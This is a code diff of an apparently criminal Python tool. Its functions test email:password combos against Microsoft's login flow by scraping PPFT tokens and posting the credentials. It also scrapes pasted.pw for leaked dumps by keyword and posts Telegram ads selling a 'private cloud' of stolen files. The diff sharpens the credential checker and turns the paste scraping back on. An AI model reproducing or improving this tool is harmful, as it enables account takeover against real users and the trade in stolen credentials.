@@ -251,8 +251,8 @@ def check_inbox_account(combo: str) -> tuple:
                 "Connection": "keep-alive"
             }, allow_redirects=True, timeout=15)
 
-        url_match  = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
-        ppft_match = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^\"]+)\"', r2.text)
+        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
+        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
         if not url_match or not ppft_match:
             return (combo, {})
 
@@ -365,10 +365,9 @@ def check_valid_account(combo: str) -> tuple:
                 "Connection": "keep-alive"
             }, allow_redirects=True, timeout=15)
 
-        url_match  = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
-        ppft_match = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^\"]+)\"', r2.text)
+        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
+        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
         if not url_match or not ppft_match:
-            import logging; logging.getLogger("mercury").warning(f"[CHECKER] No url/ppft for {email}")
             return (combo, False)
 
         post_url = url_match.group(1).replace("\\/", "/")
@@ -383,27 +382,23 @@ def check_valid_account(combo: str) -> tuple:
                 "Referer": r2.url
             }, allow_redirects=False, timeout=15)
 
-        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
+        if any(x in r3.text for x in ["account or password is incorrect", "Incorrect password", "Invalid credentials"]):
             return (combo, False)
         if any(x in r3.text for x in ["identity/confirm", "Abuse", "signedout", "locked"]):
             return (combo, False)
 
         location   = r3.headers.get("Location", "")
         if not location:
-            import logging; logging.getLogger("mercury").warning(f"[CHECKER] No location for {email} status:{r3.status_code}")
             return (combo, False)
         code_match = re.search(r'code=([^&]+)', location)
         if not code_match:
-            import logging; logging.getLogger("mercury").warning(f"[CHECKER] No code for {email} loc:{location[:80]}")
             return (combo, False)
 
         return (combo, True)
 
     except requests.exceptions.Timeout:
-        import logging; logging.getLogger("mercury").warning(f"[CHECKER] Timeout {email}")
         return (combo, False)
-    except Exception as ex:
-        import logging; logging.getLogger("mercury").warning(f"[CHECKER] Exception {email}: {ex}")
+    except Exception:
         return (combo, False)
 
 
@@ -435,38 +430,30 @@ async def run_inbox_checker(combos: list) -> dict:
 
 
 # ─── PASTED.PW ───────────────────────────────────────────────────────────────
-async def scrape_pastedpw(page, pages: int = 5) -> list[dict]:
-    """Scrape pasted.pw using Playwright to bypass Cloudflare."""
+async def scrape_pastedpw(pages: int = 5) -> list[dict]:
+    """Scrape pasted.pw recent page using aiohttp."""
     found = []
-    for page_num in range(1, pages + 1):
-        url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
-        try:
-            await page.goto(url, wait_until="domcontentloaded", timeout=30000)
-            # Wait for CF to clear — keep waiting until links appear
-            await page.wait_for_selector('a[href*="view.php"]', timeout=15000)
-            await page.wait_for_timeout(500)
-            matches = await page.evaluate("""
-                (keywords, blacklist) => {
-                    const results = [];
-                    for (const a of document.querySelectorAll('a[href*="view.php"]')) {
-                        const title = (a.innerText || a.textContent || '').trim();
-                        const tl = title.toLowerCase();
-                        if (keywords.some(k => tl.includes(k)) && !blacklist.some(b => tl.includes(b))) {
-                            const m = a.href.match(/id=(\d+)/);
-                            if (m) results.push({
-                                title: title,
-                                url: 'https://pasted.pw/view.php?id=' + m[1],
-                                source: 'pasted.pw'
-                            });
-                        }
-                    }
-                    return results;
-                }
-            """, KEYWORDS, BLACKLIST)
-            found.extend(matches)
-            log.info(f"pasted.pw page {page_num}: {len(matches)} match(es)")
-        except Exception as e:
-            log.error(f"pasted.pw page {page_num} failed: {e}")
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
+    async with aiohttp.ClientSession(headers=headers) as sess:
+        for page_num in range(1, pages + 1):
+            url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
+            try:
+                async with sess.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
+                    html = await r.text(errors="ignore")
+                # Extract paste IDs and titles from anchor tags
+                matches = re.findall(r'href="view\.php\?id=(\d+)"[^>]*>\s*([^<]+?)\s*</a>', html)
+                for paste_id, title in matches:
+                    title = title.strip()
+                    if any(k in title.lower() for k in KEYWORDS):
+                        if not any(b in title.lower() for b in BLACKLIST):
+                            found.append({
+                                "title": title,
+                                "url": f"https://pasted.pw/view.php?id={paste_id}",
+                                "source": "pasted.pw"
+                            })
+                log.info(f"pasted.pw page {page_num}: {len(found)} match(es) so far")
+            except Exception as e:
+                log.error(f"pasted.pw page {page_num} failed: {e}")
     return found
 
 
@@ -578,12 +565,12 @@ async def monitor_loop():
                     log.info(f"Page {page_num}: {len(matches)} match(es)")
                     found.extend(matches)
 
-                # pasted.pw scraping disabled
-                # try:
-                #     pw_found = await scrape_pastedpw(page, PAGES_TO_SCAN)
-                #     found.extend(pw_found)
-                # except Exception as e:
-                #     log.error(f"pasted.pw scrape failed: {e}")
+                # ── Also scrape pasted.pw ─────────────────────────────
+                try:
+                    pw_found = await scrape_pastedpw(PAGES_TO_SCAN)
+                    found.extend(pw_found)
+                except Exception as e:
+                    log.error(f"pasted.pw scrape failed: {e}")
 
                 # Deduplicate and filter blacklisted titles
                 seen_this_run = set()
@@ -756,22 +743,22 @@ async def monitor_loop():
                                     file_list = "\n".join(f"  • {fn}" for fn in private_post_count_ref["recent_filenames"])
                                     private_post_count_ref["recent_filenames"] = []
                                     pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
-                                    promo_path = os.path.join("/app", "promo.gif")
+                                    promo_path = os.path.join("/app", "promo.png")
                                     async with aiohttp.ClientSession() as sess:
-                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:  # TELEGRAM_PUBLIC_CHAT2 disabled
+                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:
                                             try:
                                                 if os.path.exists(promo_path):
                                                     form = aiohttp.FormData()
                                                     form.add_field("chat_id", pub_chat)
                                                     form.add_field("caption", pub_text)
                                                     with open(promo_path, "rb") as img:
-                                                        form.add_field("animation", img.read(), filename="promo.gif", content_type="image/gif")
-                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendAnimation", data=form)
+                                                        form.add_field("photo", img.read(), filename="promo.png", content_type="image/png")
+                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data=form)
                                                     body = await resp.json()
                                                     if not body.get("ok"):
-                                                        log.error(f"Telegram sendAnimation failed: {body}")
+                                                        log.error(f"Telegram sendPhoto failed: {body}")
                                                     else:
-                                                        log.info(f"Posted public update with gif to {pub_chat}")
+                                                        log.info(f"Posted public update with image to {pub_chat}")
                                                 else:
                                                     log.warning(f"promo.png not found at {promo_path}, sending text only")
                                                     resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
